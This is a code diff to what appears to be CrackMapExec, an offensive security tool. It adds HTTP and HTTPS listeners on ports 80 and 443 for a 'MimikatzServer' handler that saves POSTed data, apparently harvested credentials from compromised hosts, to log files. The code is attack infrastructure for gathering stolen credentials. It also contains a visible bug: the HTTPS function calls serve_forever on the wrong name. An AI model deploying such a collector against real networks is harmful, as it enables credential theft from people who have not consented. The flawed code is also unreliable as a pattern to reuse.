@@ -1,7 +1,9 @@
 from BaseHTTPServer import BaseHTTPRequestHandler
-from core.utils import shutdown
+from threading import Thread
 from core.logger import *
 from datetime import datetime
+import BaseHTTPServer
+import ssl
 
 class MimikatzServer(BaseHTTPRequestHandler):
 
@@ -48,3 +50,16 @@ class MimikatzServer(BaseHTTPRequestHandler):
         with open('logs/' + log_name, 'w') as creds:
             creds.write(data)
         print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
+
+def http_server(self):
+    http_server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
+    t = Thread(name='http_server', target=http_server.serve_forever)
+    t.setDaemon(True)
+    t.start()
+
+def https_server(self):
+    server = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
+    server.socket = ssl.wrap_socket(server.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
+    t = Thread(name='https_server', target=http_server.serve_forever)
+    t.setDaemon(True)
+    t.start()
